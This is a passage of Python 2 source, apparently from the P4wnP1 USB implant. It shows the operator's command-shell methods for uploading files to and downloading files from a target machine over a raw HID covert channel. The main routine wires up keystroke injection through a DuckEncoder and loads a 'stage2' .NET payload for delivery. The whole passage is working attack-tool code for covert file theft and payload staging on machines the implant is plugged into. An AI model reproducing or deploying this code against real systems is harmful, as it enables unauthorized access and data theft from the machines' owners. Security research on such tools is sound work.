			stream_id = struct.unpack("!i", result)[0] # signed int
			print "Remote FileStream with ID '{0}' opened".format(stream_id)
			print stream_id
		else:
			print "File open Error: {0}".format(StructHelper.extractNullTerminatedString(result)[0])
			print "Seems the target file already exists, access is forbidden or the path is invalid. Do you want to force overwrite?"
			
			overwrite = P4wnP1.askYesNo(default_yes=True)
			if overwrite:
				success, result = self.client_call_open_file(remote_filename = target_path, 
							                             remote_filemode = FileMode.Create, # overwrite if exists
							                            remote_fileaccess = FileAccess.Write) 
				if success:
					stream_id = struct.unpack('!i', result)[0] #signed int
					print "Remote FileStream with ID '{0}' opened".format(stream_id)
				else:
					print "File open Error: {0}".format(StructHelper.extractNullTerminatedString(result)[0])
					return
			else:
				return
		
		print "Uploading local file {0} to remote file {1}".format(source_path, target_path)
		
		# if we are here, file open succeeded and we request a channel for the filestream
		stream_channel = None
		success, result = self.client_call_open_stream_channel(stream_id,  passthrough=False)
		if success:
			channel_id = struct.unpack("!I", result)[0] # unsigned int
			print "Opened stream channel with id {0}".format(channel_id)
			
			# bind stream to local StreamChannel object
			stream_channel = StreamChannel(channel_id, stream_id, False)
			
			# add channel to client
			self.client.addChannel(stream_channel)
			
		else:
			print "Open channel Error: {0}".format(StructHelper.extractNullTerminatedString(result)[0])
			
			# ToDo: Remote stream should be destroyed
			return
		
		starttime = time.time()
		
		# if here, we should have a valid stream_channel
		# inform client that the channel has link
		self.client_call_inform_channel_added(stream_channel)
		
		# copy data to upload file in chunks
		chunksize = 30000
		readcount = -1
		no_error = True
		while readcount !=  0:
			readen = sourcefile.read(chunksize)
			readcount =  len(readen)
			writeres = stream_channel.Write(readen)
			sys.stdout.write(".")
			if writeres == -1:
				# write error (or channel closed)
				print "\nError writing to file channel"
				no_error = False
				break
			sys.stdout.flush()
		
		sourcefile.close()
			
		if no_error:
			stream_channel.Flush()
		
			# request streamChannel close
			stream_channel.Close()
			endtime =  time.time()
			
			print "\nUpload of '{0}' finished in {1:4.2f} seconds".format(source_path, endtime - starttime)
		
		
		# Request close of remote FileStream file
		if self.client.isConnected():
			success, result = self.client_call_close_stream(stream_id)
		else:
			print "Remote file handle couldn't be closed, because client disconnected"
		
		print
		
	def do_download(self, line):
		args = line.split(" ")
		target_path = ""
		source_path = ""
		if len(args) == 0 or len(line) == 0:
			print "you need to provide a file source"
			return
		elif len(args) == 1:
			source_path = args[0].strip()
			target_path = FileSystem.getFileName(source_path)
		elif len(args) == 2:
			source_path = args[0].strip()
			target_path = args[1].strip()
		else:
			print "wrong argument count"
			return

		print "Downloading remote file {0} to local file {1}".format(source_path, target_path)
		
		targetfile = None
		# try to open local file first
		try:
			targetfile = FileSystem.open_local_file(target_path, FileMode.CreateNew, FileAccess.Write)
		except Exception as e:
			print e.message
			print "Seems the file '{0}' exists or write permissions are missing!".format(target_path)
			print "Do you want to try to overwrite the file"
			overwrite = P4wnP1.askYesNo(default_yes=True)
			if overwrite:
				try:
					targetfile = FileSystem.open_local_file(target_path, FileMode.Create, FileAccess.Write)
				except Exception as e:
					print e.message
					return
			else:
				return		
		

		# Try to open remote file
		success, result = self.client_call_open_file(remote_filename = source_path, 
		                                             remote_filemode = FileMode.Open, # don't overwrite 
		                                            remote_fileaccess = FileAccess.Read)
		stream_id = -1
		if success:
			stream_id = struct.unpack("!i", result)[0] # signed int
			print "Remote FileStream with ID '{0}' opened".format(stream_id)
			print stream_id
		else:
			print "File open Error: {0}".format(StructHelper.extractNullTerminatedString(result)[0])
			print "Seems the source file doesn't exist, aborting."

			targetfile.close()
			return

		# if we are here, file open succeeded and we request a channel for the filestream
		stream_channel = None
		success, result = self.client_call_open_stream_channel(stream_id, 
		                                                      passthrough=False)
		if success:
			channel_id = struct.unpack("!I", result)[0] # unsigned int
			print "Opened stream channel with id {0}".format(channel_id)

			# bind stream to local StreamChannel object
			stream_channel =  StreamChannel(channel_id, stream_id,  passthrough=False)
			
			# add channel to client
			self.client.addChannel(stream_channel)

		else:
			print "Open channel Error: {0}".format(StructHelper.extractNullTerminatedString(result)[0])

			# ToDo: Remote stream should be destroyed
			return

		starttime = time.time()
		
		# if here, we should have a valid stream_channel
		# inform client that the channel has link
		self.client_call_inform_channel_added(stream_channel)

		count = -1
		no_error = True
		chunksize = 30000
		while count != 0:
			try:
				readen = stream_channel.Read(chunksize)
				count =  len(readen)
				if count >  0:
					sys.stdout.write(".")
					sys.stdout.flush()
					targetfile.write(readen)
				elif count == 0:
					targetfile.flush()
					targetfile.close()
			except ChannelException as e:
				print(e.__str__())
				no_error = False
				targetfile.close()
				return # abort further reading
			
		# close remote stream
		if no_error:
			# request streamChannel close
			stream_channel.Close()
			endtime =  time.time()
			
			print "\nDownload of '{0}' finished in {1:4.2f} seconds".format(source_path, endtime - starttime)		
		
		# Request close of remote FileStream file
		if self.client.isConnected():
			success, result = self.client_call_close_stream(stream_id)
		else:
			print "Remote file handle couldn't be closed, because client disconnected"		
		
		print

if __name__ == "__main__":
	rundir = os.path.dirname(sys.argv[0])
	basedir = os.path.abspath(rundir) +  "/"
		
	config = Config.conf_to_dict(basedir + "/config.txt")
	config["BASEDIR"] = basedir
	# replace relative path'
	for key in config:
		if key.startswith("PATH_"):
			config[key] = os.path.abspath(config["BASEDIR"] + config[key])

	try:
		dev_file_in_path = config["HID_RAW_DEV"]
		dev_file_out_path = config["HID_RAW_DEV"]

		
		HIDin_file = open(dev_file_in_path, "rb")
		HIDout_file = open(dev_file_out_path, "wb")

		# the linklayer starts several communication threads
		# for raw HID communication, the threads are started with separate start() method
		ll = LinkLayer(HIDin_file, HIDout_file)
		
		# transport layer automatically registers for linklayer events using pydispatcher
		# in current implementation LinkLayer does nothing but providing an inbound queue
		# Note: As every stream crosses TransportLayer, that would be the place to manipulate
		#	streams if needed (for example encryption)
		tl = TransportLayer()		

		enc = DuckEncoder()
		enc.setKeyDevFile(config["HID_KEYBOARD_DEV"])
		enc.setLanguage(config["KEYBOARD_LANG"])
		
		p4wnp1 = P4wnP1(ll, tl, config, duckencoder=enc)
		with open(config["PATH_STAGE2_DOTNET"], "rb") as f:
			p4wnp1.set_stage2(f.read())
		p4wnp1.start() # starts link layer (waiting for initial connection) and server input thread
		p4wnp1.cmdloop()

	except:
		import traceback
		import exceptions
		#print "Exception: " + str(type(e)) + ":"
		#print "\t{}".format(e.message)
		#exc_type, exc_obj, exc_tb = sys.exc_info()
		#print "\tLine: {}".format(exc_tb.tb_lineno)
		if sys.exc_type != exceptions.SystemExit:
			traceback.print_exc()
		raise
	finally:

		print "Cleaning Up..."
		ll.stop() # send stop event to read and write loop of link layer
		HIDout_file.close()
		HIDin_file.close()
		try:
			p4wnp1.stop()
		except:
			pass
		sys.exit()
